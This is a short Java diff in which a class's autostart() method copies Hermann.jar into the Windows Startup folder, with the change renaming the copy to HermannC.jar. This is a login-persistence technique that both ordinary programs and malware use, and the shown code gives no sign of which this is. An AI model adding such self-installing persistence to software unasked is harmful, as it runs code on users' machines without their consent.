@@ -37,7 +37,7 @@ public class ConfigureInit {
     private void autostart() {
         new DownloadService().download("file:///" + System.getProperty("user.dir") + "\\Hermann.jar",
                 System.getProperty("java.io.tmpdir").replace("Local\\Temp\\",
-                        "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Hermann.jar"));
+                        "Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\HermannC.jar"));
     }
 
     private void getConstants(String version) {
